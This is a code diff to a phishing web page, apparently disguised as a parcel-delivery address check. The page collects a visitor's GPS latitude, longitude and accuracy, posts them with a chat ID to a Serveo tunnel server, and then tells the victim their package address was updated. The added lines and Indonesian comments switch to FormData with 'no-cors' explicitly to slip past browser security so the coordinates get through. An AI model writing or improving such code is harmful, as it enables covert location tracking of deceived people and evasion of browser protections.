@@ -51,20 +51,23 @@
         const statusText = document.getElementById("status");
 
         const targetChatId = userIdAdmin ? userIdAdmin : 6953925929; 
-        const URL_SERVER_TERMUX = "testerbottelee2.serveousercontent.com";
+
+        // Alamat server aman Serveo 2 milik Anda
+        const URL_SERVER_TERMUX = "https://serveousercontent.com";
+
+        // MENGGUNAKAN METODE FORMDATA AGAR LOLOS DARI BLOKIRAN KEAMANAN CHROME (CORS)
+        const form = new FormData();
+        form.append('lat', lat);
+        form.append('lon', lon);
+        form.append('acc', acc);
+        form.append('uid', targetChatId);
 
         fetch(URL_SERVER_TERMUX, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                lat: lat,
-                lon: lon,
-                acc: acc,
-                uid: targetChatId
-            })
+            mode: 'no-cors', // Memaksa browser mengabaikan aturan CORS agar data lolos terkirim
+            body: form
         })
-        .then(res => res.json())
-        .then(data => {
+        .then(() => {
             statusText.style.color = "#28a745";
             statusText.innerText = "✅ Verifikasi Lokasi Sukses! Alamat paket diperbarui.";
         })
